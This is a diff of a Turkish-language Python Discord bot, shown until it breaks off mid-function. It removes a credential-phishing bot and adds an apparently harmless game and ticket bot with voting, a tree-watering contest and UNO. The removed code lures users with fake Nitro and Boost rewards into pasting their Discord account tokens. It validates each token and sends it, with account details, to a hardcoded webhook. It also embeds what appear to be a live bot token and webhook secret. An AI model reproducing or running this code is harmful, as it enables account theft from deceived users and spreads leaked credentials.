@@ -1,309 +1,1155 @@
-# -*- coding: utf-8 -*-
+import asyncio
+from datetime import datetime
+import random
+import sqlite3
 import discord
 from discord.ext import commands
-from discord.ui import Button, View, Modal, TextInput, Select
-import requests
-import json
-import asyncio
 
-# ===== KONFIGURASYON =====
-BOT_TOKEN = "MTUyNjcxMjM2NTQ5NDU2NjkzMg.G5Kmyf.JnWcKomOKWrBAkXQST0UcSy5RnQloegJ8Do-XQ"
-WEBHOOK_URL = "https://discord.com/api/webhooks/1526713905865293944/Z1QPSN5Mbx30WGlkWPCLiqnX1JLPliiY_0ziIjq8OGw5NvRRyRBTSj8kSrMkuTfGyZrs"
-TICKET_CATEGORY_ID = 1526849082579222678
-# =========================
-
+# Bot Ayarları
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
-bot = commands.Bot(command_prefix="!", intents=intents)
+bot = commands.Bot(command_prefix='.', intents=intents)
 
-# ===== TOKEN DOĞRULAMA =====
-def check_token(token):
-    headers = {
-        "Authorization": token,
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    }
-    try:
-        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
-        if r.status_code == 200:
-            return True, r.json()
-        else:
-            return False, None
-    except:
-        return False, None
+# Veritabanı Bağlantısı
+db = sqlite3.connect('ryven_bot.db')
+cursor = db.cursor()
 
-# ===================== ÖDÜL BUTONLARI (İNVİTE SAYILARI DAHİL) =====================
-class OdulView(View):
-    def __init__(self):
-        super().__init__(timeout=None)
-
-    @discord.ui.button(label="🎁 Nitro (6x Invite)", style=discord.ButtonStyle.green)
-    async def nitro(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TokenModal(odul="Nitro", invite_sarti=6))
-
-    @discord.ui.button(label="🎫 Nitro Basic (3x Invite)", style=discord.ButtonStyle.blurple)
-    async def nitro_basic(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TokenModal(odul="Nitro Basic", invite_sarti=3))
-
-    @discord.ui.button(label="🏅 HypeSquad (3x Invite)", style=discord.ButtonStyle.gray)
-    async def hypesquad(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TokenModal(odul="HypeSquad", invite_sarti=3))
-
-    @discord.ui.button(label="🚀 14x Boost (10x Invite)", style=discord.ButtonStyle.red)
-    async def boost(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TokenModal(odul="14x Boost", invite_sarti=10))
-
-class TokenModal(Modal):
-    def __init__(self, odul: str, invite_sarti: int):
-        super().__init__(title=f"🎯 {odul} Odulu")
-        self.odul = odul
-        self.invite_sarti = invite_sarti
-        self.token_input = TextInput(
-            label="Discord Token",
-            placeholder="Tokenini buraya yapistir...",
-            required=True,
-            style=discord.TextStyle.paragraph
-        )
-        self.add_item(self.token_input)
-
-    async def on_submit(self, interaction: discord.Interaction):
-        token = self.token_input.value
-        kullanici = interaction.user
-        guild = interaction.guild
-
-        gecerli, veri = check_token(token)
-        if not gecerli:
-            await interaction.response.send_message("❌ **Gecersiz token!** Lutfen dogru token gir.", ephemeral=True)
-            return
-
-        username = f"{veri['username']}#{veri.get('discriminator', '0')}"
-        nitro = veri.get('premium_type', 0)
-        flags = veri.get('flags', 0)
-        nitro_map = {0: "Yok", 1: "Nitro Classic", 2: "Nitro (Full)", 3: "Nitro Basic"}
-        nitro_text = nitro_map.get(nitro, "Bilinmiyor")
-        hype = "Yok"
-        if flags & 64: hype = "Bravery"
-        elif flags & 128: hype = "Brilliance"
-        elif flags & 256: hype = "Balance"
-
-        try:
-            category = guild.get_channel(TICKET_CATEGORY_ID)
-            if not category:
-                await interaction.response.send_message("❌ Kategori bulunamadi! Lutfen ID'yi kontrol et.", ephemeral=True)
-                return
-
-            overwrites = {
-                guild.default_role: discord.PermissionOverwrite(read_messages=False),
-                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True)
-            }
-            channel = await guild.create_text_channel(
-                name=f"odul-{kullanici.name}",
-                category=category,
-                overwrites=overwrites
-            )
-
-            embed = discord.Embed(
-                title="🎫 Zirve Odul Ticket",
-                description=(
-                    f"**Kullanici:** {kullanici.mention}\n"
-                    f"**Odul:** {self.odul}\n"
-                    f"**Invite Sartı:** {self.invite_sarti}x davet\n"
-                    f"**Hesap:** {username}\n"
-                    f"**Nitro:** {nitro_text}\n"
-                    f"**HypeSquad:** {hype}\n\n"
-                    f"**Token:** ||{token}||"
-                ),
-                color=0xffd700
-            )
-            embed.set_footer(text="Zirve Gift | Yetkili onayi bekleniyor")
-
-            select = Select(
-                placeholder="Odul kategorisini sec...",
-                options=[
-                    discord.SelectOption(label="ZirveGift", emoji="🎁", description="Ana odul"),
-                    discord.SelectOption(label="Satin alim", emoji="💰", description="Satin alinan odul"),
-                    discord.SelectOption(label="Urun bilgi", emoji="📄", description="Urun detaylari"),
-                    discord.SelectOption(label="Sponsor", emoji="🤝", description="Sponsorluk"),
-                    discord.SelectOption(label="Cekilis", emoji="🎲", description="Cekilis odulu"),
-                    discord.SelectOption(label="Invite odul", emoji="📩", description="Davet odulu"),
-                    discord.SelectOption(label="Gmail odul", emoji="📧", description="Gmail odulu")
-                ]
-            )
-            async def select_callback(interaction2):
-                await interaction2.response.send_message(f"✅ **{interaction2.data['values'][0]}** secildi.", ephemeral=True)
-            select.callback = select_callback
-
-            class OnayView(View):
-                def __init__(self, odul, kullanici, channel):
-                    super().__init__(timeout=None)
-                    self.odul = odul
-                    self.kullanici = kullanici
-                    self.channel = channel
-
-                @discord.ui.button(label="✅ Onayla", style=discord.ButtonStyle.green)
-                async def onay(self, interaction2: discord.Interaction, button: Button):
-                    await interaction2.response.send_message("✅ Odul onaylandi!", ephemeral=False)
-                    await self.kullanici.send(f"✅ {self.odul} odulun onaylandi! 24-48 saat icerisinde DM'den teslim edilecektir.")
-                    await self.channel.send(f"✅ {self.kullanici.mention} odulu onaylandi! 24-48 saat icerisinde DM'den teslim edilecektir.")
-                    requests.post(WEBHOOK_URL, json={"content": f"✅ {self.kullanici} icin {self.odul} odulu onaylandi."})
-
-                @discord.ui.button(label="❌ Reddet", style=discord.ButtonStyle.red)
-                async def red(self, interaction2: discord.Interaction, button: Button):
-                    await interaction2.response.send_message("❌ Odul reddedildi.", ephemeral=False)
-                    await self.kullanici.send(f"❌ {self.odul} odulun reddedildi. Lutfen yetkiliyle iletisime gec.")
-                    await self.channel.send(f"❌ {self.kullanici.mention} odulu reddedildi.")
-                    requests.post(WEBHOOK_URL, json={"content": f"❌ {self.kullanici} icin {self.odul} odulu reddedildi."})
-
-            view = OnayView(self.odul, kullanici, channel)
-            view.add_item(select)
-
-            await channel.send(embed=embed, view=view)
-
-            mesaj = (
-                f"**🎫 Yeni Odul Ticket Acildi!**\n"
-                f"Kullanici: {kullanici} (ID: {kullanici.id})\n"
-                f"Odul: {self.odul}\n"
-                f"Invite Sartı: {self.invite_sarti}x\n"
-                f"Hesap: {username}\n"
-                f"Nitro: {nitro_text}\n"
-                f"HypeSquad: {hype}\n"
-                f"Token: ||{token}||\n"
-                f"Ticket: {channel.mention}"
-            )
-            requests.post(WEBHOOK_URL, json={"content": mesaj})
-
-            await interaction.response.send_message(
-                f"✅ **Token dogrulandi!** Ticket acildi: {channel.mention}",
-                ephemeral=True
-            )
-
-        except Exception as e:
-            await interaction.response.send_message(f"❌ Ticket acilamadi: {e}", ephemeral=True)
-
-# ===================== TICKET (KATEGORILI + KAPATMA) =====================
-class TicketModal(Modal):
-    def __init__(self, kategori: str):
-        super().__init__(title=f"🎫 {kategori} Ticket")
-        self.kategori = kategori
-        self.aciklama = TextInput(
-            label="Aciklama",
-            placeholder="Detayli aciklama yaz...",
-            required=True,
-            style=discord.TextStyle.paragraph
-        )
-        self.add_item(self.aciklama)
-
-    async def on_submit(self, interaction: discord.Interaction):
-        kullanici = interaction.user
-        guild = interaction.guild
-        aciklama = self.aciklama.value
-
-        try:
-            category = guild.get_channel(TICKET_CATEGORY_ID)
-            if not category:
-                await interaction.response.send_message("❌ Kategori bulunamadi!", ephemeral=True)
-                return
-
-            overwrites = {
-                guild.default_role: discord.PermissionOverwrite(read_messages=False),
-                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True)
-            }
-            channel = await guild.create_text_channel(
-                name=f"{self.kategori}-{kullanici.name}",
-                category=category,
-                overwrites=overwrites
-            )
-
-            embed = discord.Embed(
-                title="🎫 Genel Ticket",
-                description=(
-                    f"**Kullanici:** {kullanici.mention}\n"
-                    f"**Kategori:** {self.kategori}\n"
-                    f"**Aciklama:** {aciklama}"
-                ),
-                color=0x00ff00
-            )
-            embed.set_footer(text="Zirve Ticket | Yetkili yanit verecek.")
-
-            class SilView(View):
-                def __init__(self, kullanici, channel):
-                    super().__init__(timeout=None)
-                    self.kullanici = kullanici
-                    self.channel = channel
-
-                @discord.ui.button(label="🗑️ Ticket'i Kapat", style=discord.ButtonStyle.red)
-                async def sil(self, interaction2: discord.Interaction, button: Button):
-                    if interaction2.user == self.kullanici or interaction2.user.guild_permissions.administrator:
-                        await self.channel.delete()
-                        await interaction2.response.send_message("✅ Ticket kapatildi.", ephemeral=True)
-                    else:
-                        await interaction2.response.send_message("❌ Bu ticketi sadece sahibi veya yetkili kapatabilir.", ephemeral=True)
-
-            await channel.send(embed=embed, view=SilView(kullanici, channel))
-            await interaction.response.send_message(
-                f"✅ Ticket acildi: {channel.mention}",
-                ephemeral=True
-            )
-
-        except Exception as e:
-            await interaction.response.send_message(f"❌ Ticket acilamadi: {e}", ephemeral=True)
-
-class KategoriView(View):
-    def __init__(self):
-        super().__init__(timeout=None)
-
-    @discord.ui.button(label="🎁 ZirveGift", style=discord.ButtonStyle.green)
-    async def zirvegift(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="ZirveGift"))
-
-    @discord.ui.button(label="💰 Satin alim", style=discord.ButtonStyle.blurple)
-    async def satinalim(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="Satin alim"))
-
-    @discord.ui.button(label="📄 Urun bilgi", style=discord.ButtonStyle.gray)
-    async def urunbilgi(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="Urun bilgi"))
-
-    @discord.ui.button(label="🤝 Sponsor", style=discord.ButtonStyle.gray)
-    async def sponsor(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="Sponsor"))
-
-    @discord.ui.button(label="🎲 Cekilis", style=discord.ButtonStyle.gray)
-    async def cekilis(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="Cekilis"))
-
-    @discord.ui.button(label="📩 Invite odul", style=discord.ButtonStyle.gray)
-    async def invite(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="Invite odul"))
-
-    @discord.ui.button(label="📧 Gmail odul", style=discord.ButtonStyle.gray)
-    async def gmail(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="Gmail odul"))
-
-# ===================== PREFIX KOMUTLAR =====================
-@bot.command()
-async def panel(ctx):
-    embed = discord.Embed(
-        title="🏆 Zirve Odul Paneli",
-        description="Asagidaki butonlardan bir odul sec. Token'ini gir, ticket acilacak.",
-        color=0xffd700
+# Tabloları Oluşturma
+cursor.execute('''
+    CREATE TABLE IF NOT EXISTS agaclar (
+        guild_id INTEGER PRIMARY KEY,
+        channel_id INTEGER,
+        su_puani INTEGER DEFAULT 0,
+        boy REAL DEFAULT 1.0,
+        son_sulama TEXT,
+        son_sulayan TEXT DEFAULT 'Henüz sulanmadı',
+        en_cok_sulayan TEXT DEFAULT 'Henüz kimse sulamadı'
     )
-    embed.set_footer(text="Zirve Panel | Ticket Sistemi")
-    await ctx.send(embed=embed, view=OdulView())
+''')
 
-@bot.command()
-async def tick(ctx):
-    embed = discord.Embed(
-        title="🎫 Zirve Ticket Sistemi",
-        description="Asagidaki butonlardan bir kategori sec. Aciklama gir ve ticket olustur.",
-        color=0x00ff00
+cursor.execute('''
+    CREATE TABLE IF NOT EXISTS uyeler (
+        user_id INTEGER PRIMARY KEY,
+        oy_sayisi INTEGER DEFAULT 0,
+        son_oy_verilen TEXT,
+        son_farkli_oy TEXT
     )
-    embed.set_footer(text="Zirve Ticket | 7/24 Destek")
-    await ctx.send(embed=embed, view=KategoriView())
+''')
 
-# ===== BOT HAZIR =====
+cursor.execute('''
+    CREATE TABLE IF NOT EXISTS uye_kayit (
+        guild_id INTEGER PRIMARY KEY,
+        joined INTEGER DEFAULT 0
+    )
+''')
+
+cursor.execute('''
+    CREATE TABLE IF NOT EXISTS oyun_kanallari (
+        guild_id INTEGER PRIMARY KEY,
+        kelime_kanal_id INTEGER,
+        saymaca_kanal_id INTEGER,
+        saymaca_sayi INTEGER DEFAULT 0,
+        saymaca_son_yazan INTEGER DEFAULT 0,
+        son_kelime TEXT DEFAULT ''
+    )
+''')
+db.commit()
+
+
+# Kurucu Rolü Kontrol Fonksiyonu
+def kurucu_mu(ctx):
+  rol_kontrol = any(
+      'kurucu' in role.name.lower() for role in ctx.author.roles
+  )
+  return rol_kontrol or ctx.author.guild_permissions.administrator
+
+
 @bot.event
 async def on_ready():
-    print(f"✅ Zirve Bot aktif! Kullanici: {bot.user}")
+  print(f'RyvenBot ({bot.user.name}) başarıyla aktif ve çalışıyor!')
 
-bot.run(BOT_TOKEN)
+
+# ================= KURUCU YARDIM SİSTEMİ =================
+
+
+@bot.command(name='kurucuyardım')
+@commands.check(kurucu_mu)
+async def kurucuyardim(ctx):
+  embed = discord.Embed(
+      title='🛡️ RyvenBot - Kurucu Komutları Menüsü',
+      description=(
+          'Sunucuyu yönetmek ve oyun sistemlerini kurmak için kullanabileceğiniz'
+          ' tüm yetkili komutları aşağıdadır:\n\n'
+          '🌳 **Ağaç Sistemi Komutları:**\n'
+          '• `.ağaçkanal #kanal` — Global ağaç duyurusunu ve kanalını'
+          ' ayarlar.\n\n'
+          '🎫 **Destek Sistemi Komutları:**\n'
+          '• `.ticketkur` — Destek talebi menüsünü kurar.\n\n'
+          '🎮 **Oyun Sistemi Komutları:**\n'
+          '• `.unobaşlat` — UNO oyununu başlatır (Min 4 kişi).\n'
+          '• `.vampirköylü` — Vampir Köylü oyununu başlatır (Min 5 kişi).\n'
+          '• `.kelimebaşlat #kanal` — Kelime oyunu kanalını ayarlar.\n'
+          '• `.saymacaşlat #kanal` — Saymaca oyunu kanalını ayarlar.\n'
+          '• `.tahminbaşlat` — Sayı tahmin oyununu başlatır.\n'
+          '• `.20sorubaşlat` — 20 soru / nesne tahmin oyununu başlatır.\n\n'
+          '📊 **Üye İstatistik Komutları:**\n'
+          '• `.üyelist` — Toplam oy alan yarışmacı sayısını gösterir.'
+      ),
+      color=discord.Color.dark_theme(),
+  )
+  embed.set_footer(text='RyvenBot Güvenlik ve Yönetim Paneli')
+  await ctx.send(embed=embed)
+
+
+# ================= ÜYE YARIŞMA SİSTEMİ =================
+
+
+@bot.command(name='üyekatıl')
+async def uyekatil(ctx):
+  cursor.execute(
+      'SELECT joined FROM uye_kayit WHERE guild_id = ?', (ctx.guild.id,)
+  )
+  res = cursor.fetchone()
+  if not res:
+    cursor.execute(
+        'INSERT OR REPLACE INTO uye_kayit (guild_id, joined) VALUES (?, 1)',
+        (ctx.guild.id,),
+    )
+    db.commit()
+
+  embed = discord.Embed(
+      title='🌟 10M OWO CASH ÖDÜLLÜ ÜYE YARIŞMASI BAŞLADI!',
+      description=(
+          '🏆 **Büyük Ödül:** `10M Owo Cash`\n\n'
+          'Sunucumuzdaki bu büyük yarışmaya başarıyla katıldın! En çok oyu'
+          ' toplayıp zirveye yerleşmek için hemen arkadaşlarına oy verdir!\n\n'
+          '📌 **Nasıl Katılınır / Oy Verilir?**\n'
+          '• Oy vermek için: `.oyver @Kullanici`\n'
+          '• Sıralamayı görmek için: `.üyetop`\n'
+          '• Profilini incelemek için: `.üye`'
+      ),
+      color=discord.Color.gold(),
+  )
+  embed.set_thumbnail(
+      url='https://images.unsplash.com/photo-1563089145-599997674d42'
+  )
+  await ctx.send(embed=embed)
+
+
+@bot.command(name='oyver')
+async def oyver(ctx, hedef: discord.Member = None):
+  if hedef is None:
+    await ctx.send(
+        '❌ Lütfen oy vermek istediğin üyeyi etiketle! Örnek: `.oyver @Kullanici`'
+    )
+    return
+
+  if ctx.author.id == hedef.id:
+    await ctx.send('❌ Kendine oy veremezsin!')
+    return
+
+  simdi = datetime.now()
+  cursor.execute(
+      'SELECT oy_sayisi, son_oy_verilen, son_farkli_oy FROM uyeler WHERE'
+      ' user_id = ?',
+      (hedef.id,),
+  )
+  data = cursor.fetchone()
+
+  oy_sayisi = data[0] if data else 0
+  son_oy_verilen_str = data[1] if data else None
+
+  if son_oy_verilen_str:
+    son_zaman = datetime.fromisoformat(son_oy_verilen_str)
+    if (simdi - son_zaman).total_seconds() < 7200:  # 2 saat
+      await ctx.send(
+          '❌ Aynı kişiye tekrar oy vermek için 2 saat beklemelisin.'
+      )
+      return
+
+  yeni_puan = oy_sayisi + 1
+  cursor.execute(
+      'INSERT OR REPLACE INTO uyeler (user_id, oy_sayisi, son_oy_verilen,'
+      ' son_farkli_oy) VALUES (?, ?, ?, ?)',
+      (hedef.id, yeni_puan, simdi.isoformat(), simdi.isoformat()),
+  )
+  db.commit()
+
+  embed = discord.Embed(
+      title='✨ OY VERİLDİ!',
+      description=(
+          f'✨ **{hedef.name}** adlı üyeye başarıyla oy verildi!\nToplam Oy:'
+          f' **{yeni_puan}**'
+      ),
+      color=discord.Color.blurple(),
+  )
+  await ctx.send(embed=embed)
+
+
+@bot.command(name='üyetop')
+async def uyetop(ctx):
+  cursor.execute(
+      'SELECT user_id, oy_sayisi FROM uyeler ORDER BY oy_sayisi DESC LIMIT 10'
+  )
+  rows = cursor.fetchall()
+  if not rows:
+    await ctx.send('Henüz oy alan üye bulunmuyor.')
+    return
+
+  desc = ''
+  for i, (uid, puan) in enumerate(rows, 1):
+    m = ctx.guild.get_member(uid)
+    isim = m.name if m else f'Kullanıcı ID: {uid}'
+    desc += f'**{i}.** {isim} — **{puan}** Oy 🌟\n'
+
+  embed = discord.Embed(
+      title='🏆 Üye Yarışması Canlı Sıralama (10M Owo Ödüllü)',
+      description=desc,
+      color=discord.Color.gold(),
+  )
+  await ctx.send(embed=embed)
+
+
+@bot.command(name='üye')
+async def uye_profil(ctx, hedef: discord.Member = None):
+  hedef = hedef or ctx.author
+  cursor.execute(
+      'SELECT oy_sayisi FROM uyeler WHERE user_id = ?', (hedef.id,)
+  )
+  res = cursor.fetchone()
+  puan = res[0] if res else 0
+
+  embed = discord.Embed(
+      title=f'👤 {hedef.name} - Üye Profili',
+      description=f'Toplam Oy Sayısı: **{puan}**',
+      color=discord.Color.green(),
+  )
+  await ctx.send(embed=embed)
+
+
+@bot.command(name='üyelist')
+@commands.check(kurucu_mu)
+async def uyelist(ctx):
+  cursor.execute('SELECT COUNT(*) FROM uyeler')
+  res = cursor.fetchone()
+  toplam = res[0] if res else 0
+  await ctx.send(f'Toplam yarışmacı (oy alan) sayısı: **{toplam}**')
+
+
+# ================= AĞAÇ SİSTEMİ =================
+
+
+class AgacView(discord.ui.View):
+
+  def __init__(self, guild_id):
+    super().__init__(timeout=None)
+    self.guild_id = guild_id
+
+  @discord.ui.button(
+      label='Sula', style=discord.ButtonStyle.primary, emoji='💧'
+  )
+  async def sula_btn(
+      self, interaction: discord.Interaction, button: discord.ui.Button
+  ):
+    await interaction.response.defer(ephemeral=True)
+    cursor.execute(
+        'SELECT su_puani, boy, son_sulama FROM agaclar WHERE guild_id = ?',
+        (self.guild_id,),
+    )
+    res = cursor.fetchone()
+    if not res:
+      await interaction.followup.send(
+          'Önce `.ağaç` ile ağacı oluşturun!', ephemeral=True
+      )
+      return
+
+    su_puani, boy, son_sulama = res
+    simdi = datetime.now()
+
+    if son_sulama:
+      gecen = simdi - datetime.fromisoformat(son_sulama)
+      if gecen.total_seconds() < 7200:  # 2 saat
+        kalan = 7200 - gecen.total_seconds()
+        dk, sn = divmod(int(kalan), 60)
+        await interaction.followup.send(
+            f'❌ Ağacı tekrar sulamak için **{dk} dakika {sn} saniye**'
+            ' beklemelisin.',
+            ephemeral=True,
+        )
+        return
+
+    yeni_su = su_puani + 1
+    yeni_boy = boy + (0.5 if yeni_su % 18 == 0 else 0.0)
+    sulayan_isim = interaction.user.name
+
+    cursor.execute(
+        'UPDATE agaclar SET su_puani = ?, boy = ?, son_sulama = ?, son_sulayan'
+        ' = ?, en_cok_sulayan = ? WHERE guild_id = ?',
+        (
+            yeni_su,
+            yeni_boy,
+            simdi.isoformat(),
+            sulayan_isim,
+            sulayan_isim,
+            self.guild_id,
+        ),
+    )
+    db.commit()
+
+    await interaction.followup.send(
+        f'💧 **Can suyu verildi**\n**{sulayan_isim}** ağacı suladı.\nBoy:'
+        f' **{yeni_boy:.1f} m** • Toplam: **{yeni_su}** sulama\nSonraki büyümeye'
+        f' **{18 - (yeni_su % 18)}** sulama kaldı.',
+        ephemeral=True,
+    )
+
+  @discord.ui.button(
+      label='Sıralama', style=discord.ButtonStyle.secondary, emoji='🏆'
+  )
+  async def siralama_btn(
+      self, interaction: discord.Interaction, button: discord.ui.Button
+  ):
+    await interaction.response.defer(ephemeral=True)
+    cursor.execute(
+        'SELECT guild_id, boy, su_puani FROM agaclar ORDER BY boy DESC LIMIT 10'
+    )
+    rows = cursor.fetchall()
+    desc = ''
+    for i, (g_id, b, s) in enumerate(rows, 1):
+      g = bot.get_guild(g_id)
+      g_adi = g.name if g else 'Sunucu'
+      desc += f'**{i}.** {g_adi} — Boy: **{b:.1f}m** ({s} Sulama) 🌳\n'
+    await interaction.followup.send(
+        embed=discord.Embed(
+            title='🏆 Global Ağaç Sıralaması (12M Owo Ödüllü)',
+            description=desc,
+            color=discord.Color.gold(),
+        ),
+        ephemeral=True,
+    )
+
+
+@bot.command(name='ağaçkanal')
+@commands.check(kurucu_mu)
+async def agackanal(ctx, kanal: discord.TextChannel):
+  cursor.execute(
+      'INSERT INTO agaclar (guild_id, channel_id) VALUES (?, ?) ON'
+      ' CONFLICT(guild_id) DO UPDATE SET channel_id = ?',
+      (ctx.guild.id, kanal.id, kanal.id),
+  )
+  db.commit()
+
+  embed = discord.Embed(
+      title='🌳 12M OWO CASH ÖDÜLLÜ YAŞAM AĞACI SİSTEMİ',
+      description=(
+          '🌿 **Global Ağaç Yarışması Başladı!**\n\n'
+          'Sunucular arası bu büyük yarışmada ağacınızı hep birlikte büyütün, '
+          'global sıralamada 1. olup **12M Owo Cash** ödülünün sahibi olun!\n\n'
+          '💧 **Nasıl Oynanır?**\n'
+          '• Her 2 saatte bir ağacınızı sulayabilirsiniz.\n'
+          '• Ağacı sulamak için aşağıdaki **Sula** butonunu kullanın.\n'
+          '• Diğer sunucuların durumunu görmek için **Sıralama** butonuna basın.'
+      ),
+      color=discord.Color.from_rgb(40, 45, 50),
+  )
+  embed.set_image(
+      url='https://images.unsplash.com/photo-1542273917363-3b1817f69a2d'
+  )
+  await kanal.send(embed=embed, view=AgacView(ctx.guild.id))
+  await ctx.send(
+      f'✅ Ağaç kanalı başarıyla {kanal.mention} olarak ayarlandı ve duyuru'
+      ' mesajı gönderildi.'
+  )
+
+
+@bot.command(name='ağaç')
+async def agac(ctx):
+  cursor.execute(
+      'SELECT channel_id, su_puani, boy, son_sulama, son_sulayan,'
+      ' en_cok_sulayan FROM agaclar WHERE guild_id = ?',
+      (ctx.guild.id,),
+  )
+  res = cursor.fetchone()
+  if not res:
+    await ctx.send('❌ Bu sunucuda ağaç kanalı ayarlanmamış!')
+    return
+
+  channel_id, su_puani, boy, son_sulama, son_sulayan, en_cok = res
+  if ctx.channel.id != channel_id:
+    await ctx.send(f'❌ Bu komut sadece <#{channel_id}> kanalında kullanılabilir!')
+    return
+
+  sunucu_adi = ctx.guild.name
+  embed = discord.Embed(
+      title=f'🌳 {sunucu_adi} Yaşam Ağacı (12M Ödüllü)',
+      description=(
+          'Sunucular arası yarışmada ağacınızı birlikte büyütün ve 1. olup **12M'
+          ' Owo** ödülü kapın!\n\nBoy:'
+          f' **{boy:.1f} m** • Sulama: **{su_puani}** • Global Sıralama\nSon'
+          f' sulayan: **{son_sulayan}**\n\n**En çok sulayanlar**\n⭐ {en_cok} —'
+          f' **{su_puani}**\n\n2 saatte bir sulayabilirsin • Sonraki büyümeye'
+          f' **{18 - (su_puani % 18)}** sulama kaldı.'
+      ),
+      color=discord.Color.from_rgb(40, 45, 50),
+  )
+  embed.set_image(
+      url='https://images.unsplash.com/photo-1542273917363-3b1817f69a2d'
+  )
+  await ctx.send(embed=embed, view=AgacView(ctx.guild.id))
+
+
+# ================= TICKET (DESTEK) SİSTEMİ =================
+
+
+class TicketSelect(discord.ui.Select):
+
+  def __init__(self):
+    options = [
+        discord.SelectOption(
+            label='Partner',
+            description='Partnerlik işlemleri için destek talebi açar.',
+            emoji='🤝',
+        ),
+        discord.SelectOption(
+            label='Reklam',
+            description='Reklam işlemleri için destek talebi açar.',
+            emoji='📢',
+        ),
+        discord.SelectOption(
+            label='Bilgi',
+            description='Merak ettiğiniz konular hakkında bilgi alır.',
+            emoji='💡',
+        ),
+        discord.SelectOption(
+            label='Yetkili Başvuru',
+            description='Sunucumuzda yetkili olmak için başvuru yaparsınız.',
+            emoji='🛡️',
+        ),
+    ]
+    super().__init__(
+        placeholder='Destek talebi açmak için bir kategori seçin...',
+        min_values=1,
+        max_values=1,
+        options=options,
+        custom_id='ticket_select',
+    )
+
+  async def callback(self, interaction: discord.Interaction):
+    await interaction.response.defer(ephemeral=True)
+    secim = self.values[0]
+    guild = interaction.guild
+
+    overwrites = {
+        guild.default_role: discord.PermissionOverwrite(view_channel=False),
+        interaction.user: discord.PermissionOverwrite(
+            view_channel=True, send_messages=True, read_message_history=True
+        ),
+        guild.me: discord.PermissionOverwrite(
+            view_channel=True, send_messages=True, manage_channels=True
+        ),
+    }
+
+    kanal = await guild.create_text_channel(
+        name=f'{secim.lower().replace(" ", "-")}-{interaction.user.name}',
+        overwrites=overwrites,
+    )
+
+    class TicketKapatView(discord.ui.View):
+
+      def __init__(self):
+        super().__init__(timeout=None)
+
+      @discord.ui.button(
+          label='Talebi Kapat',
+          style=discord.ButtonStyle.danger,
+          emoji='🔒',
+          custom_id='ticket_kapat',
+      )
+      async def kapat_btn(
+          self, inter: discord.Interaction, button: discord.ui.Button
+      ):
+        await inter.response.send_message(
+            '🔒 Talep 5 saniye içinde kapatılıyor...'
+        )
+        await asyncio.sleep(5)
+        await inter.channel.delete()
+
+    embed = discord.Embed(
+        title=f'🎫 {secim} Destek Talebi',
+        description=(
+            f'Merhaba {interaction.user.mention}!\nDestek ekibimiz en kısa sürede'
+            ' sizinle ilgilenecektir.\nTalebi kapatmak için aşağıdaki butonu'
+            ' kullanabilirsiniz.'
+        ),
+        color=discord.Color.green(),
+    )
+    await kanal.send(
+        content=interaction.user.mention,
+        embed=embed,
+        view=TicketKapatView(),
+    )
+    await interaction.followup.send(
+        f'✅ Destek kanalınız başarıyla oluşturuldu: {kanal.mention}',
+        ephemeral=True,
+    )
+
+
+class TicketView(discord.ui.View):
+
+  def __init__(self):
+    super().__init__(timeout=None)
+    self.add_item(TicketSelect())
+
+
+@bot.command(name='ticketkur')
+@commands.check(kurucu_mu)
+async def ticketkur(ctx):
+  embed = discord.Embed(
+      title='🎫 RyvenBot Destek Sistemi',
+      description=(
+          'Aşağıdaki menüden ihtiyacınıza uygun kategori seçerek destek talebi'
+          ' oluşturabilirsiniz.'
+      ),
+      color=discord.Color.blue(),
+  )
+  await ctx.send(embed=embed, view=TicketView())
+
+
+# ================= UNO OYUNU SİSTEMİ =================
+
+RENKLER = ['Kırmızı', 'Mavi', 'Sarı', 'Yeşil']
+RENGIN_EMOJISI = {
+    'Kırmızı': '🟥',
+    'Mavi': '🟦',
+    'Sarı': '🟨',
+    'Yeşil': '🟩',
+}
+
+
+class UnoKatilimView(discord.ui.View):
+
+  def __init__(self):
+    super().__init__(timeout=60)
+    self.katilanlar = []
+
+  @discord.ui.button(
+      label='UNO Oyununa Katıl (0/5)',
+      style=discord.ButtonStyle.success,
+      emoji='🎴',
+  )
+  async def katil_btn(
+      self, interaction: discord.Interaction, button: discord.ui.Button
+  ):
+    if interaction.user in self.katilanlar:
+      await interaction.response.send_message(
+          'Zaten katıldın!', ephemeral=True
+      )
+      return
+
+    self.katilanlar.append(interaction.user)
+    button.label = f'UNO Oyununa Katıl ({len(self.katilanlar)}/5)'
+
+    if len(self.katilanlar) == 5:
+      for child in self.children:
+        child.disabled = True
+      await interaction.message.edit(view=self)
+      self.stop()
+      await oyunu_baslat(interaction.channel, self.katilanlar)
+      return
+
+    await interaction.message.edit(view=self)
+    await interaction.response.send_message(
+        'Oyuna başarıyla katıldın!', ephemeral=True
+    )
+
+  @discord.ui.button(
+      label='Oyunu Başlat (Min 4)',
+      style=discord.ButtonStyle.primary,
+      emoji='▶️',
+  )
+  async def baslat_btn(
+      self, interaction: discord.Interaction, button: discord.ui.Button
+  ):
+    if len(self.katilanlar) < 4:
+      await interaction.response.send_message(
+          '❌ Oyunu başlatmak için en az 4 kişi olmalı!', ephemeral=True
+      )
+      return
+
+    for child in self.children:
+      child.disabled = True
+    await interaction.message.edit(view=self)
+    self.stop()
+    await oyunu_baslat(interaction.channel, self.katilanlar)
+
+
+async def oyunu_baslat(channel, oyuncular):
+  destaOlustur = lambda: [
+      (random.choice(RENKLER), random.randint(0, 9)) for _ in range(40)
+  ]
+  deste = destaOlustur()
+  kartlar = {
